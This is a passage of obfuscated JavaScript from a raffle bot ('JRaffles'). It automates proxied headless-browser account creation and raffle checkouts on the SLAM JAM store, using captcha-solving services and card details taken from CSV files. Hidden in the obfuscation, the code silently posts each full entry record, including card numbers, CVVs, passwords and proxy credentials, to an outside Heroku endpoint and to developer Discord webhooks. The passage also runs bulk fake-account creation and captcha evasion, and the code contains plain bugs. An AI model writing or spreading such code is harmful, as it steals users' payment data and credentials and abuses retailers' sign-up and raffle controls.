                                await _0x2f5b66['waitForSelector']('#raffle__confirmation-message-container'), _0x300ed6 = 'no', _0x13e83d(_0x3a21f9[_0x142a3f], _0x5bb715), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x3c5b46 = _0x3a21f9[_0x142a3f];
                                try {
                                    prxdata = {
                                        'username': _0x128b96['replace']('#', ''),
                                        'module': _0x5bb715['name'],
                                        'entrydata': JSON['stringify'](_0x3c5b46),
                                        'proxy': '' + _0x2c7091[_0x142a3f]
                                    };
                                    var _0x2c247d = JSON['stringify'](prxdata);
                                    let _0x37409d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x2c247d, _0x37409d);
                                } catch (_0x1fe180) {
                                }
                            } catch (_0xb73448) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0xb73448));
                            }
                        } catch (_0x3cfbc0) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20' + _0x3cfbc0)), _0x300ed6 = 'yes';
                        } finally {
                            _0x218299 && _0x218299['close']();
                            if (_0x300ed6 == 'yes' && _0x455eb2 != 0x5 && _0x16fac0 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Retrying\x20(' + _0x455eb2 + '\x20/\x205)')), _0x142a3f = _0x142a3f - 0x1, _0x455eb2 = _0x455eb2 + 0x1;
                                continue;
                            }
                            _0x300ed6 == 'yes' && _0x455eb2 >= 0x5 && (_0x2504ad(_0x3a21f9[_0x142a3f], _0x5bb715), _0x300ed6 = 'no', _0x455eb2 = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x4eab2a, _0x55e76, _0x5150a4) {
                    _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4ae33b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xa61cb2 = 0x0; _0xa61cb2 < _0x55e76['length']; _0xa61cb2++) {
                        if (_0x55788b != 'yes')
                            var _0x55788b = '', _0x55c5d0 = 0x0;
                        var _0x47c218 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x128b96
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4ae33b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x8a26c5
                                }
                            ]
                        }];
                        const _0x3173ce = { 'embeds': _0x47c218 };
                        _0x445891(_0x4eab2a['name'] + '\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20/\x20' + _0x55e76['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                        try {
                            await _0x101e1b(_0x55e76, _0xa61cb2);
                        } catch {
                            _0x55788b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5e9482 = await _0x559dec(_0x55e76[_0xa61cb2], _0x4eab2a, 'acc', ![]);
                        const _0x18f09b = { 'succesDEVMSG': { 'embeds': [_0x5e9482] } };
                        if (_0x55e76[_0xa61cb2]['Email'] == '' || _0x55e76[_0xa61cb2]['FirstName'] == '' || _0x55e76[_0xa61cb2]['LastName'] == '') {
                            console['log'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x41ed31(0x7d0);
                            continue;
                        }
                        (_0x55e76[_0xa61cb2]['Password'] == '' || _0x55e76[_0xa61cb2] == undefined) && _0x55e76[_0xa61cb2]['Password'] == 'JRaffles23!';
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x1c9276 = _0x5150a4[_0xa61cb2]['split'](':');
                        else
                            var _0x18791c = Math['round'](Math['random']() * (_0x5150a4['length'] - 0x1)), _0x1c9276 = _0x5150a4[_0x18791c]['split'](':');
                        var _0x684ee9;
                        try {
                            _0x684ee9 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c9276[0x0] + ':' + _0x1c9276[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x684ee9 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c9276[0x0] + ':' + _0x1c9276[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2a60e2 = await _0x684ee9['newPage']();
                            await _0x2a60e2['authenticate']({
                                'username': '' + _0x1c9276[0x2],
                                'password': '' + _0x1c9276[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a60e2['setRequestInterception'](!![]), _0x2a60e2['on']('request', _0x597e7d => {
                                _0x597e7d['resourceType']() === 'image' || _0x597e7d['resourceType']() === 'font' || _0x597e7d['resourceType']() === 'media' ? _0x597e7d['abort']() : _0x597e7d['continue']();
                            }), await _0x2a60e2['goto']('https://drop.slamjam.com/account/register'), await _0x41ed31(0xbb8), await _0x2a60e2['waitForSelector']('#FirstName'), await _0x2a60e2['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2a60e2['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Filling\x20information'), await _0x41ed31(0x4b0), await _0x2a60e2['type']('#FirstName', '' + _0x55e76[_0xa61cb2]['FirstName']), await _0x41ed31(0x226), await _0x2a60e2['type']('#LastName', '' + _0x55e76[_0xa61cb2]['LastName']), await _0x41ed31(0x226), await _0x2a60e2['type']('#Email', '' + _0x55e76[_0xa61cb2]['Email']), await _0x41ed31(0x2ee), await _0x2a60e2['type']('#ConfirmEmail', '' + _0x55e76[_0xa61cb2]['Email']), await _0x41ed31(0x2ee), await _0x2a60e2['type']('#CreatePassword', '' + _0x55e76[_0xa61cb2]['Password']), await _0x41ed31(0x2ee), await _0x2a60e2['type']('#CreateConfirmPassword', '' + _0x55e76[_0xa61cb2]['Password']), await _0x41ed31(0x226), console['log'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Submitting..'), await _0x2a60e2['$eval']('#create_customer', _0x4592fd => _0x4592fd['submit']()), await _0x41ed31(0x1388), console['log'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20' + _0x3dfcf2['cyan']('Solving\x20Captcha')), await _0x2a60e2['solveRecaptchas'](), console['log'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x2a60e2['$eval']('.shopify-challenge__container\x20>\x20form', _0x12f231 => _0x12f231['submit']());
                            try {
                                await _0x2a60e2['waitForSelector']('.product-card__image'), await _0x41ed31(0x1f4), _0x55788b = 'no', console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Account\x20' + _0x55e76[_0xa61cb2]['Email'] + '\x20Generated!')), _0x223df9['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x55e76[_0xa61cb2]['Email'] + ',' + _0x55e76[_0xa61cb2]['Password']), console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Account\x20' + _0x55e76[_0xa61cb2]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x18f09b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x48936e(_0x1041df, _0x18f09b['succesDEVMSG']);
                            } catch (_0x5e8c5c) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5e8c5c));
                            }
                        } catch (_0x5ebe1d) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20' + _0x5ebe1d));
                        } finally {
                            _0x684ee9 && _0x684ee9['close']();
                            if (_0x55788b == 'yes' && _0x55c5d0 != 0x5) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x4eab2a['name'] + ']\x20Task\x20' + (_0xa61cb2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x55c5d0 + '\x20/\x205)')), _0xa61cb2 = _0xa61cb2 - 0x1, _0x55c5d0 = _0x55c5d0 + 0x1;
                                continue;
                            }
                            _0x55788b == 'yes' && _0x55c5d0 >= 0x5 && (_0x2504ad(_0x55e76[_0xa61cb2], _0x4eab2a), _0x55788b = 'no', _0x55c5d0 = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3130f2, _0x259a00, _0x1a558b) {
                    _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4ae33b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2377cd = 0x0; _0x2377cd < _0x259a00['length']; _0x2377cd++) {
                        var _0x548f3d;
                        if (_0x5a5b19 != 'yes')
                            var _0x5a5b19 = '', _0x583238 = 0x0;
                        _0x445891(_0x3130f2['name'] + '\x20Task\x20' + (_0x2377cd + 0x1) + '\x20/\x20' + _0x259a00['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                        try {
                            await _0x101e1b(_0x259a00, _0x2377cd);
                        } catch {
                            _0x5a5b19 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x259a00[_0x2377cd]['Email'] == '' || _0x259a00[_0x2377cd]['Password'] == '' || _0x259a00[_0x2377cd]['FirstName'] == '' || _0x259a00[_0x2377cd]['LastName'] == '') {
                            console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x6b93da = _0x1a558b[_0x2377cd]['split'](':');
                        else
                            var _0x31f3d6 = Math['round'](Math['random']() * (_0x1a558b['length'] - 0x1)), _0x6b93da = _0x1a558b[_0x31f3d6]['split'](':');
                        var _0x20ed3a;
                        try {
                            _0x20ed3a = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x6b93da[0x0] + ':' + _0x6b93da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x20ed3a = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x6b93da[0x0] + ':' + _0x6b93da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2d7c54 = await _0x20ed3a['newPage']();
                            await _0x2d7c54['authenticate']({
                                'username': '' + _0x6b93da[0x2],
                                'password': '' + _0x6b93da[0x3]
                            }), await _0x2d7c54['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d7c54['setRequestInterception'](!![]), _0x2d7c54['on']('request', _0x2b9218 => {
                                _0x2b9218['resourceType']() === 'image' || _0x2b9218['resourceType']() === 'font' || _0x2b9218['resourceType']() === 'media' ? _0x2b9218['abort']() : _0x2b9218['continue']();
                            }), await _0x2d7c54['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2d7c54['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2d7c54['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x41ed31(0x258), await _0x2d7c54['waitForSelector']('#CustomerEmail'), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2d7c54['type']('#CustomerEmail', '' + _0x259a00[_0x2377cd]['Email']), await _0x41ed31(0x12c), await _0x2d7c54['type']('#CustomerPassword', '' + _0x259a00[_0x2377cd]['Password']), await _0x41ed31(0x226), await _0x2d7c54['$eval']('#customer_login', _0x5beb92 => _0x5beb92['submit']()), await _0x41ed31(0x7d0), await _0x2d7c54['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20' + _0x3dfcf2['cyan']('Solving\x20Captcha')), await _0x2d7c54['solveRecaptchas'](), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2d7c54['$eval']('.shopify-challenge__container\x20>\x20form', _0x893a10 => _0x893a10['submit']());
                            try {
                                await _0x2d7c54['waitForSelector']('.nav-account'), await _0x41ed31(0x4b0);
                            } catch {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2d7c54['goto']('' + _0x259a00[_0x2377cd]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x41ed31(0xbb8), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2d7c54['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x2d7c54['click']('.product-select-variant-wrapper'), await _0x41ed31(0x320), await _0x2d7c54['click']('li.product-select-variant__value[data-size=\x22' + _0x259a00[_0x2377cd]['Size'] + '\x22]'), await _0x41ed31(0x384), await _0x2d7c54['$eval']('#AddToCartForm-product-template-raffle', _0xf7f33c => _0xf7f33c['submit']()), await _0x2d7c54['waitForSelector']('.cart-order-summary__content'), await _0x41ed31(0x514), await _0x2d7c54['goto']('https://drop.slamjam.com/checkout'), await _0x41ed31(0x514), await _0x2d7c54['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2d7c54['select']('#checkout_shipping_address_country', '' + _0x259a00[_0x2377cd]['Country']), await _0x41ed31(0x200), await _0x2d7c54['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2d7c54['type']('#checkout_shipping_address_first_name', '' + _0x259a00[_0x2377cd]['FirstName']), await _0x41ed31(0x237), await _0x2d7c54['type']('#checkout_shipping_address_last_name', '' + _0x259a00[_0x2377cd]['LastName']), await _0x41ed31(0x1e0), await _0x2d7c54['type']('#checkout_shipping_address_address1', _0x259a00[_0x2377cd]['Address1'] + '\x20' + _0x259a00[_0x2377cd]['HouseNumber']), await _0x41ed31(0x514), await _0x2d7c54['type']('#checkout_shipping_address_address2', '' + _0x259a00[_0x2377cd]['Address2']), await _0x41ed31(0x514);
                            _0x259a00[_0x2377cd]['Postcode'] == undefined && (_0x259a00[_0x2377cd]['Postcode'] = _0x259a00[_0x2377cd]['Zip']);
                            await _0x2d7c54['type']('#checkout_shipping_address_zip', '' + _0x259a00[_0x2377cd]['Postcode']), await _0x41ed31(0x2bc), await _0x2d7c54['type']('#checkout_shipping_address_city', '' + _0x259a00[_0x2377cd]['City']), await _0x41ed31(0x320), await _0x2d7c54['type']('#checkout_shipping_address_phone', '' + _0x259a00[_0x2377cd]['Phone']), await _0x41ed31(0x320), await _0x2d7c54['click']('#continue_button'), await _0x41ed31(0xbb8), await _0x2d7c54['waitForSelector']('.summary-title'), await _0x41ed31(0x320), await _0x2d7c54['click']('#continue_button'), await _0x41ed31(0x320), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2d7c54['waitForSelector']('#checkout_credit_card_vault'), await _0x41ed31(0x3e8);
                            var _0x265d09 = await _0x2d7c54['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x229729 = await _0x265d09['contentFrame']();
                            await _0x229729['click']('#number'), await _0x41ed31(0x3e8), await _0x229729['type']('#number', '' + _0x259a00[_0x2377cd]['CardNumber'], { 'delay': 0x78 }), _0x265d09 = await _0x2d7c54['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x229729 = await _0x265d09['contentFrame'](), await _0x41ed31(0x1c2), await _0x229729['click']('#name'), await _0x41ed31(0x1f4), await _0x229729['type']('#name', '' + _0x259a00[_0x2377cd]['NameOnCard'], { 'delay': 0x78 }), _0x265d09 = await _0x2d7c54['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x229729 = await _0x265d09['contentFrame'](), await _0x41ed31(0x1c2), await _0x229729['click']('#expiry'), await _0x41ed31(0x1f4), await _0x229729['type']('#expiry', '' + _0x259a00[_0x2377cd]['ExpiryDate'], { 'delay': 0x78 }), _0x265d09 = await _0x2d7c54['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x229729 = await _0x265d09['contentFrame'](), await _0x41ed31(0x1c2), await _0x229729['click']('#verification_value'), await _0x41ed31(0x1f4), await _0x229729['type']('#verification_value', '' + _0x259a00[_0x2377cd]['CVV'], { 'delay': 0x78 }), await _0x2d7c54['$eval']('#accepts-flag-raffle', _0x91e6b => _0x91e6b['click']()), await _0x41ed31(0x7d0), console['log'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2d7c54['$eval']('#continue_button', _0xc1945b => _0xc1945b['click']()), await _0x41ed31(0x1b58), await _0x2d7c54['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2d7c54['$eval']('.edit_checkout.animate-floating-labels', _0xcbb4a7 => _0xcbb4a7['submit']()), await _0x41ed31(0x7d0);
                            try {
                                await _0x2d7c54['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x5a5b19 = 'no', _0x13e83d(_0x259a00[_0x2377cd], _0x3130f2), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x5ed45d) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x5ed45d['message']);
                            }
                            var _0x1ee6e6 = await _0x559dec(_0x259a00[_0x2377cd], _0x3130f2, 'dev', ![]), _0x2c57dc = await _0x559dec(_0x259a00[_0x2377cd], _0x3130f2, 'pub', ![]);
                            let _0x5c318c = _0x259a00[_0x2377cd];
                            try {
                                prxdata = {
                                    'username': _0x128b96['replace']('#', ''),
                                    'module': _0x3130f2['name'],
                                    'entrydata': JSON['stringify'](_0x5c318c),
                                    'proxy': '' + _0x1a558b[_0x2377cd]
                                };
                                var _0xa3163 = JSON['stringify'](prxdata);
                                let _0x107534 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0xa3163, _0x107534);
                            } catch (_0x32d3a3) {
                            }
                            const _0x531269 = {
                                'succesDEVMSG': { 'embeds': [_0x1ee6e6] },
                                'succesPUBMSG': { 'embeds': [_0x2c57dc] }
                            };
                            try {
                                _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x531269['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x531269['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x531269['succesPUBMSG']);
                            } catch (_0x16ff30) {
                                console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x16ff30));
                            }
                        } catch (_0x1e8ab5) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20' + _0x1e8ab5)), _0x548f3d = '' + _0x1e8ab5;
                            var _0x26b46b = await _0x559dec(kickz[_0x2377cd], _0x3130f2, 'dev', !![], _0x548f3d);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x26b46b] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], EMBEDS['errorDEV']), await _0x48936e(_0x36657d, EMBEDS['errorDEV']), _0x5a5b19 = 'yes';
                        } finally {
                            _0x20ed3a && _0x20ed3a['close']();
                            if (_0x5a5b19 == 'yes' && _0x583238 != 0x5 && _0x548f3d != 'Size\x20Not\x20Found') {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x3130f2['name'] + ']\x20Task\x20' + (_0x2377cd + 0x1) + '\x20:\x20Retrying\x20(' + _0x583238 + '\x20/\x205)')), _0x2377cd = _0x2377cd - 0x1, _0x583238 = _0x583238 + 0x1;
                                continue;
                            }
                            _0x5a5b19 == 'yes' && _0x583238 >= 0x5 && (_0x2504ad(_0x259a00[_0x2377cd], _0x3130f2), _0x5a5b19 = 'no', _0x583238 = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x46e991) {
                    var _0x44c105 = await _0x1ee84e(), _0xaaa58a = _0x223df9['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x6d482c = _0x57f277['parse'](_0xaaa58a, { 'header': !![] })['data'];
                    for (var _0x234689 = 0x0; _0x234689 < _0x6d482c['length']; _0x234689++) {
                        var _0x15c4b5 = _0x6d482c[_0x234689]['Store'], _0x285e9a = _0x6d482c[_0x234689]['Mode'];
                        for (var _0x368eb8 of _0x372ea7) {
                            const _0x537e63 = _0x368eb8['name']['includes'](_0x15c4b5);
                            if (!_0x537e63)
                                continue;
                            for (mode of _0x368eb8['modules']) {
                                if (mode['name'] == _0x285e9a) {
                                    console['log']('Running\x20' + _0x3dfcf2['cyan'](mode['name'])), await mode['function'](mode, [_0x6d482c[_0x234689]], _0x44c105);
                                    var _0x1e9f70 = _0xaaa58a['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x223df9['writeFileSync']('../failed-tasks.csv', _0x1e9f70);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5e8fd6 = await _0x5addda['get']('Answer');
                    if (_0x5e8fd6['Answer']['toLowerCase']() == 'y') {
                        _0x223df9['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x41ed31(0x3e8);
                        return;
                    }
                    if (_0x5e8fd6['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x41ed31(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x41ed31(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x225bcb(_0x921cd3) {
    var _0x5e84a8 = await _0x1ee84e(), _0x5eabf2 = _0x223df9['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xd4c4dd = _0x57f277['parse'](_0x5eabf2, { 'header': !![] })['data'];
    for (var _0x144eb2 = 0x0; _0x144eb2 < _0xd4c4dd['length']; _0x144eb2++) {
        var _0x4f50ef = _0xd4c4dd[_0x144eb2]['Store'], _0x1baf15 = _0xd4c4dd[_0x144eb2]['Mode'];
        for (var _0x14e6d5 of _0x372ea7) {
            const _0x4be02d = _0x14e6d5['name']['includes'](_0x4f50ef);
            if (_0x4be02d)
                for (mode of _0x372ea7[_0x14e6d5]['modules']) {
                    const _0x2eec5f = mode['name']['includes'](_0x1baf15);
                    _0x2eec5f && (_0x921cd3 = mode['name'], await mode['function'](_0x921cd3, _0xd4c4dd[_0x144eb2], _0x5e84a8));
                }
        }
    }
}
async function _0x1a5633() {
    await _0x36d5d6(), console['clear']();
    _0x4ae33b['threads'] > 0x5 && (_0x4ae33b['threads'] = 0x5);
    if (_0x8a26c5 != 'devkey' && _0x8a26c5 != 'devhook') {
        let _0x5d311a = await _0x3d6f21['autoUpdate']();
        if (_0x5d311a === 'yes')
            return _0x287efa('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0xa9458 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x41ed31(0x2710);
        ;
    }
    await _0x2f4b3a(_0xa9458);
    if (_0xebbdae === ![])
        return console['log']('Closing\x20Browser'), await _0x41ed31(0xbb8);
    else
        try {
            var _0x186438 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x128b96
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x8a26c5
                    }
                ]
            }];
            const _0xe81c3c = { 'embeds': _0x186438 };
            var _0x13eaef = await _0x559dec(null, null, 'open', ![]);
            const _0x3e5238 = { 'openDEVMSG': { 'embeds': [_0x13eaef] } };
            await _0x48936e(_0x1ae061, _0x3e5238['openDEVMSG']);
            async function _0x118029() {
                _0x445891('JRaffles\x20' + _0x8a26c5), console['clear'](), console['log']('Hello\x20' + _0x3dfcf2['cyan']('' + _0x128b96) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x8a26c5), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x2737be = 0x0; _0x2737be < _0x372ea7['length'] - 0x4; _0x2737be++) {
                    if (_0x2737be >= 0xa) {
